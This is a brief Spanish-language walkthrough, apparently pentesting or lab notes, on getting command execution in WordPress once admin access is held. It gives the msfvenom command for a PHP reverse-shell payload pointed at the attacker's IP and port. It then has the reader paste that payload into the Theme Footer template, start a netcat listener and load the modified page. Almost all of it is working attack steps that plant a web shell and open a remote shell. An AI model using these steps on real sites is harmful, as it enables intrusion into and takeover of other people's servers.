# Alterando condigo PHP
Para conseguir ejecución de comandos en WordPress en primer lugar deberemos tener acceso al panel de control.

## 1. Creamos un payload con msfvenom
```bash
msfvenom -p php/reverse_php LHOST=<"IP Atancante"> LPORT=<"Puerto de conexion a la maquina atacante"> -f raw > pwned.php
```
## 2. Copiamos el contenido del código del Payload
## 3. Pegamos el contenido del Payload en alguna plantilla de WordPress
Por ejemplo, utilizamos la plantilla *Theme Footer* que se encuentra en `Apariencia > Theme Editor > Theme Footer`

## 4. Ponemos a la escucha con la maquina atacante
```bash
nc -nlvp <"Puerto que hemos especificado en el payload">
```

## 5. Abrimos la página que hemos modificado